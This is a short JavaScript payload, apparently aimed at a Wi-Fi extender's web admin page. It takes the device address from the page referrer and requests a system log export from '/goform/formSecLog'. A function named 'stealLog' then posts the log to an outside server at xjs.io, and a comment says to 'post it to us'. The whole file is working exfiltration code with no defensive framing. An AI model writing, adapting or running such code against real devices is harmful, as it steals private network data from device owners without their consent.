function httpPost(theUrl, theData)
{
    if (theData !== null) {
        console.log(theData.length)

        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "POST", theUrl );
        xmlHttp.responseType="blob";
        xmlHttp.setRequestHeader("Content-Type", 'image/jpeg');
        xmlHttp.setRequestHeader("Content-Length", theData.length );
        xmlHttp.send(theData);
    }

}

function stealLog(theUrl)
{
    var data = null;

    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "POST", theUrl, true );

    xmlHttp.responseType="blob";
    xmlHttp.setRequestHeader("Cache-Control", "no-cache" );

    xmlHttp.onreadystatechange = function(e){
        if(xmlHttp.readyState == 4 && xmlHttp.status == 200){
            console.log(xmlHttp.response.length)

            data = xmlHttp.response;

            httpPost('http://xjs.io/datahandler.php', data );
        }
    };

    xmlHttp.send("export=Export+system+log");

    return data;
}

// get the log from the wifi extender and post it to us
stealLog( document.referrer.split('/')[2] + '/goform/formSecLog' );
